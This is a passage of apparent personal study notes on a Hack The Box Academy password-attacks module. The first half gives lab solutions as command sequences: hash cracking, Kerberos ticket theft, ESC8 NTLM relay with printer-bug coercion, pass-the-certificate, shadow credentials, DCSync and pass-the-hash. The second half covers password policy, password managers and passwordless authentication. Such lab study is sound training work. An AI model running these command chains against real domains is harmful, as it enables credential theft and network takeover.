        SERVICE PRINCIPAL : svc_workstations/
        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        AES-128 HASH : 3a7e52143531408f39101187acc80677
        
└─$ john --format=NT hash
Password4
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ ssh svc_workstations@inlanefreight.htb@10.129.206.135 -p 2222
svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt 
HTB{{REDACTED_FLAG}}
```

6. Check the sudo privileges of the `svc_workstations` user and get access as `root`. Submit the flag in /root/flag.txt directory as the response.

```bash
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Sorry, try again.
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# 

root@linux01:~# cat flag.txt 
 HTB{{REDACTED_FLAG}}
```

7. Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

```bash
root@linux01:/tmp# export KRB5CCNAME=krb5cc_647401106_Ld0VeE                                                                                                                                                                         
Default principal: julio@INLANEFREIGHT.HTB                                                                                                                                                                                             
Valid starting       Expires              Service principal                                                                                                                                                        
11/21/2026 11:20:00  11/21/2026 21:20:00  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 11/22/2026 11:20:00 
        
root@linux01:/tmp# smbclient //dc01/julio -k -c 'get julio.txt julio.txt' -no-pass
getting file \julio.txt of size 17 as julio.txt (8.3 KiloBytes/sec) (average 8.3 KiloBytes/sec)

root@linux01:/tmp# cat julio.txt 
 HTB{{REDACTED_FLAG}}
```

8. Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

```bash
root@linux01:~/.kerberos-scripts# export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
root@linux01:~/.kerberos-scripts# klist
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
11/21/2026 11:40:00  11/21/2026 21:40:00  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 11/22/2026 11:40:00
11/21/2026 11:40:00  11/21/2026 21:40:00  ldap/dc01.inlanefreight.htb@
        renew until 11/22/2026 11:40:00
11/21/2026 11:40:00  11/21/2026 21:40:00  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
        renew until 11/22/2026 11:40:00

smbclient //dc01/linux01 -k -c 'get flag.txt flag.txt' -no-pass

root@linux01:~/.kerberos-scripts# cat flag.txt 
 HTB{{REDACTED_FLAG}}
```

## Pass The Certificate

[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. `Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`. This method is used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

### AD CS NTLM Relay Attack (ESC8)

**Note:** Attacks against Active Directory Certificate Services are covered in great depth in the [ADCS Attacks](https://academy.hackthebox.com/module/details/236) module.

`ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`.

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:

```
mdn0x@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

**Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:

```
mdn0x@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`:

We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

```
mdn0x@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
mdn0x@htb[/htb]$ python3 -m venv .venv
mdn0x@htb[/htb]$ source .venv/bin/activate
mdn0x@htb[/htb]$ pip3 install -r requirements.txt
```

Then, we can begin the attack.
**Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.


```
mdn0x@htb[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git
```

```
mdn0x@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```


Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```
mdn0x@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
mdn0x@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

### Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.


We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

```
mdn0x@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

```
mdn0x@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

With the TGT obtained, we may once again `pass the ticket`:

In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```
mdn0x@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

### No PKINIT?

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

### Onwards

Now that we've seen how to perform various lateral movement techniques from Windows and Linux hosts, we'll pivot to a new focus: password management. Note that we recommend practicing all these lateral movement techniques until they become second nature. You never know what you will run into during an assessment, so having an extensive toolset to fall back on is critical.

### Exercise

Authenticate to with user "wwhite" and password "package5shores_topher1"

1. What are the contents of flag.txt on jpinkman's desktop?

```bash
$ ./pywhisker.py --dc-ip 10.129.207.69 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

$ python3 gettgtpkinit.py -cert-pfx /home/htb-ac-830862/pywhisker/pywhisker/H5Di7hY0.pfx -pfx-pass 'pass' -dc-ip 10.129.207.69 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

$ export KRB5CCNAME=/tmp/jpinkman.ccache

$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

2. What are the contents of flag.txt on Administrator's desktop?

```bash
$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
$ evil-winrm -i 10.129.234.174 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```


---
## Password Management

Now that we have worked through numerous ways to capture credentials and passwords, let us turn our attention to best practices for password and identity protection. Speed limits and traffic laws exist so that we drive safely. Without them, driving would be chaotic. The same is true when a company does not have proper policies in place; users could act without constraints regardless of the consequences. This is why service providers and administrators define and enforce policies for better security.

Let us meet Mark, a new employee at Inlanefreight Corp. Mark does not work in IT and is not aware of the risks associated with weak passwords. When prompted to set his business email password, he chooses `password123`. However, he receives an error stating that the password does not meet the company's password policy, along with a message explaining the minimum requirements for a more secure password.

In this example, we have two major components: the definition of the password policy and its enforcement. The definition outlines the rules and expectations for password creation, while enforcement is the technology use to enforce compliance. Both are essential aspects to a successful password policy implementation. In this lesson, we will explore how to create a strong password policy and how to enforce it effectively.
### Password policy

A [password policy](https://en.wikipedia.org/wiki/Password_policy) is a set of rules designed to enhance computer security by encouraging users to create strong passwords and use them appropriately according to the organization's standards. The scope of a password policy extends beyond minimum password requirements to encompass the entire password lifecycle (such as creation, storage, management, and transmission).
#### Password policy standards

Due to compliance requirements and best practices, many companies follow established [IT security standards](https://en.wikipedia.org/wiki/IT_security_standards). While adhering to these standards does not guarantee complete security, it is a widely accepted industry practice that defines a baseline for security controls with an organization. However, compliance alone should not be the sole measure of an organization's security controls.

Some security standards include sections on password policies or guidelines. Here are a few of the most common:

- [NIST SP800-63B](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf)
- [CIS Password Policy Guide](https://www.cisecurity.org/insights/white-papers/cis-password-policy-guide)
- [PCI DSS](https://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss)

These standards offer different perspectives on password security. We can study them to help shape our own password policy. Let's examine a use-case where standards differ significantly: `password expiration`.

In the past, we may have heard phrases such as `"change your password every 90 days to stay secure."` The truth is that not every organization follows this—some only required password changes in the event of a confirmed compromise. Today, the industry has shifted to recommending that password expiration be disabled, as it often leads users to adopt predictable, weak patterns.
#### Sample password policy

To illustrate important considerations, here is a sample password policy. It requires that all passwords:

- Minimum of 8 characters.
- Include uppercase and lowercase letters.
- Include at least one number.
- Include at least one special character.
- It should not be the username.
- It should be changed every 60 days.

Our new employee, Mark, who initially received an error when trying to set his email password to `password123`, now chooses `Inlanefreight01!` and successfully registers his account. While this password meets the company's policy requirements, it is still weak and easily guessable, as it includes the company name. We learned in the "Password Mutations" section that this is a common practice of employees, and attackers are aware of this.

Once the password reaches its expiration, Mark can simply change `01` to `02`, and the new password still complies with the company's policy despite being nearly identical to the previous one. For this reason, there is ongoing debate among security professionals about the effectiveness of password expiration policies and when users should be required to change their passwords.

Based on this example, we should include certain blacklisted words in our password policies. These may include, but are not limited to:

- The company's name
- Common words associated with the company
- Names of months
- Names of seasons
- Variations on the words "welcome" and "password"
- Common and easily guessable words such as "password", "123456", and "abcde"
#### Enforcing password policy

A password policy is a set of guidelines for how passwords should be created, managed, and stored within an organization. To implement this policy effectively, it must be enforced using the technology at our disposal or by acquiring the necessary tools. Most applications and identity management systems offer features to support the enforcement of such policies.

For instance, if we use Active Directory for authentication, we can configure an [Active Directory Password Policy GPO](https://activedirectorypro.com/how-to-configure-a-domain-password-policy/) to ensure users comply with our policy.

Once the technical aspect is covered, the policy must be communicated to the rest of the company. Subsequently, processes and procedures should be created to guarantee that the password policy is applied everywhere.

### Creating a strong password

Creating a strong password doesn't have to be difficult. Tools like [PasswordMonster](https://www.passwordmonster.com/) help evaluate the strength of passwords, while [1Password Password Generator](https://1password.com/password-generator/) can generate secure ones.

The password `CjDC2x[U` was generated by the tool and is considered strong. It would take a long time to crack and is unlikely to be guessed or exposed via password spraying attacks. However, it may be difficult to remember.

We can create strong passwords using ordinary words, phrases, or even lyrics from songs we like. For example, a good password might be `This is my secure password` or `The name of my dog is Popy`. To make these phrases more complex, we can add special characters, such as `()The name of my dog is Popy!`. While such passwords are difficult to guess, we should keep in mind that attackers can use OSINT to learn about us, and we should keep this in mind when creating passwords.

Using this method, we can create and remember several strong passwords. However, as the number grows, it becomes increasingly difficult to manage them all. In the next section, we will explore how using a password manager can help generate and securely store a large number of passwords.

## Password Managers

It seems like everything requires a password nowadays. We use them for home Wi-Fi, social networks, bank accounts, business emails, and our favorite applications and websites. According to a [study conducted by NordPass](https://www.techradar.com/news/most-people-have-25-more-passwords-than-at-the-start-of-the-pandemic), the average person now has around 100 passwords. This is one of the main reasons people often reuse passwords or create overly simple ones.

Given this reality, we need to have strong, unique passwords for each service. Yet, it is unrealistic to expect anyone to memorize hundreds of complex credentials. This is where a [password manager](https://en.wikipedia.org/wiki/Password_manager) becomes essential. A password manager is an application that securely stores passwords and sensitive information in an encrypted database. In addition to keeping data safe, password managers offer features such as password generation, two-factor authentication (2FA) support, secure form filling, browser integration, multi-device synchronization, security alerts, and more.

### How does a password manager work?

The implementation of password managers varies by provider, but most operate using a master password to encrypt the password database.

The Encryption and authentication rely on us [cryptographic hash functions](https://en.wikipedia.org/wiki/Cryptographic_hash_function) and [key derivation functions](https://en.wikipedia.org/wiki/Key_derivation_function) to prevent unauthorized access to the encrypted database and its content. The specific mechanisms used depend on the provider and whether the password manager is cloud-based or locally stored.

Let's break down some common password managers and how they work.

### Cloud password managers

One of the key considerations when choosing a password manager is convenience. The average person owns three or four devices and uses them to log into different websites and applications. A cloud-based password manager allows users to synchronize their encrypted password database across multiple devices. Most of them provide:

- A mobile application.
- A browser add-on.
- Some other features that we'll discuss later in this section.

Each password manager vendor implements security in their own way, and usually provide a technical document detailing how their system works. You can refer to the whitepapers from [Bitwarden](https://web.archive.org/web/20220101043531/https://bitwarden.com/images/resources/security-white-paper-download.pdf), [1Password](https://1passwordstatic.com/files/security/1password-white-paper.pdf), and [LastPass](https://web.archive.org/web/20221106173545/https://assets.cdngetgo.com/da/ce/d211c1074dea84e06cad6f2c8b8e/lastpass-technical-whitepaper.pdf) as examples (though many others exist). Let's take a look at how these systems generally work.

A common implementation for cloud password managers involves deriving encryption keys from the master password. This approach supports [Zero-Knowledge Encryption](https://blog.cubbit.io/blog-posts/what-is-zero-knowledge-encryption), which ensures that no one, not even the service provider, can access your secured data. To illustrate this, let's examine Bitwarden's approach to password derivation:

- `Master key`: Derived from the master password using a key derivation function.
- `Master password hash`: Generated using the master password (and often the master key) to authenticate the user to the cloud service.
- `Decryption key`: Created using the master key to form a symmetric key, which is then used to decrypt vault items.

This is a simplified explanation of how password managers operate. In practice, the implementation is more complex. For deeper insight, refer to the technical documents linked above or watch the [How Password Managers Work – Computerphile](https://www.youtube.com/watch?v=w68BBPDAWr8) video.

Some of the most popular cloud password managers are:

- [1Password](https://1password.com/)
- [Bitwarden](https://bitwarden.com/)
- [Dashlane](https://www.dashlane.com/)
- [Keeper](https://www.keepersecurity.com/)
- [Lastpass](https://www.lastpass.com/)
- [NordPass](https://nordpass.com/)
- [RoboForm](https://www.roboform.com/)

### Local password managers

Some companies and individuals prefer to manage their own security for various reasons, opting not to rely on third-party services. Local password managers provide this option by storing the password database locally and placing the responsibility on the user to protect its content and storage location. [Dashlane](https://www.dashlane.com/) published a blog post, [Password Manager Storage: Cloud vs. Local](https://blog.dashlane.com/password-storage-cloud-versus-local/), which explores the pros and cons of each approach. As the blog states, "At first it might seem like this makes local storage more secure than cloud storage, but cybersecurity is not a simple discipline." This post serves as a useful starting point for understanding which method may better suit different password management scenarios.

Local password managers use encryption methods similar to those of cloud-based implementations. The most notable difference lies in data transmission and authentication. To encrypt the database, local password managers focus on securing the database stored on the local system, using various cryptographic hash functions (depending on the manufacturer). They also employ key derivation functions with random salt to prevent precomputed keys and to hinder dictionary and guessing attacks. Some offer additional protections such as memory protection and keylogger resistance, using a secure desktop environment similar to Windows User Account Control (UAC).

Some of the most widely used local password managers are:

- [KeePass](https://keepass.info/)
- [KWalletManager](https://apps.kde.org/kwalletmanager5/)
- [Pleasant Password Server](https://pleasantpasswords.com/)
- [Password Safe](https://pwsafe.org/)

### Features

Let's imagine we use Linux, Android, and Chrome OS. We access our applications and websites from multiple devices and want to synchronize all passwords and secure notes across them. We also need extra protection through 2FA, and our budget is $5 per month. This information can help us identify the most suitable password manager for our needs.

When choosing between a cloud or local password manager, it's important to understand the available features. [Wikipedia](https://en.wikipedia.org/wiki/List_of_password_managers) offers a helpful list of both online and offline password managers, along with their key capabilities. Here are some of the most common features:

- [2FA](https://authy.com/what-is-2fa/) support.
- Multi-platform (Android, iOS, Windows, Linux, Mac, etc.).
- Browser Extension.
- Login Autocomplete.
- Import and export capabilities.
- Password generation.

### Alternatives

Passwords are the most common form of authentication, but not the only one. As we've seen throughout this module, passwords can be compromised in many ways: cracking, guessing, shoulder surfing, and more. But what if we didn't need passwords at all? Is that even possible?

By default, most operating systems and applications are built around password based authentication. However, administrators can adopt third-party identity providers or applications to enhance identity protection. Some of the most common alternatives include:

- [Multi-factor Authentication (MFA)](https://en.wikipedia.org/wiki/Multi-factor_authentication)
- [FIDO2](https://fidoalliance.org/fido2/), an open authentication standard that enables passwordless logins using physical devices like [YubiKey](https://www.yubico.com/). For a broader list of devices, see [Microsoft’s supported FIDO2 providers](https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-authentication-passwordless#fido2-security-key-providers).
- [One-Time Passwords (OTP)](https://en.wikipedia.org/wiki/One-time_password)
- [Time-Based One-Time Passwords (TOTP)](https://en.wikipedia.org/wiki/Time-based_one-time_password)
- [IP restrictions](https://news.gandi.net/en/2019/05/using-ip-restriction-to-help-secure-your-account)
- Device compliance enforcement via tools like [Microsoft Endpoint Manager](https://www.petervanderwoude.nl/post/tag/device-compliance/) or [Workspace ONE](https://www.loginconsultants.com/enabling-the-device-compliance-with-workspace-one-uem-authentication-policy-in-workspace-one-access)

### Going passwordless

Many companies—including [Microsoft](https://www.microsoft.com/en-us), [Auth0](https://auth0.com/), [Okta](https://www.okta.com/), and [Ping Identity](https://www.pingidentity.com/en.html)—are advocating for a [passwordless](https://en.wikipedia.org/wiki/Passwordless_authentication) future. This strategy aims to remove passwords as an authentication method altogether.

[Passwordless](https://www.pingidentity.com/en/resources/blog/posts/2021/what-does-passwordless-really-mean.html) authentication is achieved when an authentication factor other than a password is used. A password is a knowledge factor, meaning it's something a user knows. The problem with relying on a knowledge factor alone is that it's vulnerable to theft, sharing, repeat use, misuse, and other risks. Passwordless authentication ultimately means no more passwords. Instead, it relies on a possession factor (something a user has) or an inherent factor (something a user is) to verify user identity with greater assurance.

As new technology and standards evolve, we need to investigate and understand the details of their implementation to determine whether those alternatives will provide the security we need for the authentication process. You can read more about Passwordless authentication and different vendor strategies:

- [Microsoft Passwordless](https://www.microsoft.com/en-us/security/business/identity-access-management/passwordless-authentication)
- [Auth0 Passwordless](https://auth0.com/passwordless)
- [Okta Passwordless](https://www.okta.com/passwordless-authentication/)
- [PingIdentity](https://www.pingidentity.com/en/resources/blog/posts/2021/what-does-passwordless-really-mean.html)

There are many options available for protecting passwords. Choosing the right one depends on the specific needs of the individual or organization. It is common for both people and companies to use different password protection methods for different purposes.

Continue to:
[Skills Assessment - Password Attacks](../../../Skills%20Assessment%20-%20Password%20Attacks.md)

---





